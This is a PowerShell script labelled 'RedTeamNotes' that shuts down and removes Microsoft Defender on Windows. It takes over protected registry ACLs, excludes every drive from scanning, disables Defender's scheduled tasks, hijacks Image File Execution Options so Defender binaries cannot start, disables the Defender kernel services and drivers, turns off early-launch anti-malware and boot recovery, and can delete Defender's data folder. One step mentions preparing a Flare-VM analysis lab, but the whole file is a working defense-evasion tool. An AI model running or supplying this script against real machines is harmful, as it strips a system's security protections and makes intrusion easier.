<#
.SYNOPSIS
    RedTeamNotes: Native-Only Hardened Microsoft Defender Removal.
.DESCRIPTION
    Native PowerShell script for deactivating Microsoft Defender. 
    Uses ACL hijacking to modify protected registry keys.
#>

[CmdletBinding()]
param (
    [Parameter()]
    [Switch]$PurgeFiles
)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper: Take Ownership and Grant FullControl ---
function Grant-RegistryPermission {
    param([string]$Path)
    # Registry keys are often owned by System/TrustedInstaller.
    # We must hijack the ACL to grant 'Administrators' FullControl.
    $Acl = Get-Acl -Path $Path
    $Ar = New-Object System.Security.AccessControl.RegistryAccessRule(
        "Administrators", "FullControl", "Allow"
    )
    $Acl.SetAccessRule($Ar)
    try {
        Set-Acl -Path $Path -AclObject $Acl -ErrorAction Stop
    } catch {
        Write-Warning "    [!] ACL update failed for $Path. Ensure Tamper Protection is OFF."
    }
}

# 1. Verification: Tamper Protection
$TPPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
$TPVal = Get-ItemProperty $TPPath -ErrorAction SilentlyContinue
if ($TPVal.TamperProtection -ne 4) {
    Write-Host "[!] CRITICAL: Tamper Protection is ENABLED. Manual disablement required in GUI." -ForegroundColor Yellow
}

# 2. Step 1/5: FileSystem Exclusion
Write-Host "[Step 1/5] Injecting global filesystem exclusions..."
67..90 | ForEach-Object {
    $Drive = [char]$_ + ":\"
    if (Test-Path $Drive) {
        Add-MpPreference -ExclusionPath $Drive -ErrorAction SilentlyContinue
    }
}

# 3. Step 2/5: Disable Scheduled Tasks
Write-Host "[Step 2/5] Neutralizing Defender Scheduled Tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 4. Step 3/5: IFEO Hijacking (Process Execution Block)
Write-Host "[Step 3/5] Applying IFEO redirection..."
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe", "MpSigStub.exe")
foreach ($Bin in $Binaries) {
    # Using ${Bin} to prevent ParserError with colons
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\${Bin}"
    if (-not (Test-Path $Key)) { New-Item $Key -Force | Out-Null }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d"
}

# 5. Step 4/5: Service Registry Surgery (ACL-based)
Write-Host "[Step 4/5] Disabling Kernel Services and Drivers..."
$Services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $Services) {
    # Using ${Svc} to explicitly bound the variable name
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\${Svc}"
    if (Test-Path $RegPath) {
        Grant-RegistryPermission -Path $RegPath
        try {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction Stop
            Write-Host "    [-] ${Svc}: Disabled" -ForegroundColor Gray
        } catch {
            Write-Host "    [X] ${Svc}: Access Denied (Manual Tamper Protection OFF required)" -ForegroundColor Red
        }
    }
}

# 6. Step 5/5: ELAM & Recovery Deactivation
Write-Host "[Step 5/5] Finalizing Environment for Flare-VM..."
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue
bcdedit /set {current} recoveryenabled No | Out-Null

if ($PurgeFiles) {
    Write-Host "[!] Purging Defender physical structure..."
    $Target = "C:\ProgramData\Microsoft\Windows Defender"
    if (Test-Path $Target) {
        takeown /f $Target /r /d y | Out-Null
        icacls $Target /grant administrators:F /t | Out-Null
        Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "[#] RedTeamNotes: Native removal complete. REBOOT REQUIRED." -ForegroundColor Green
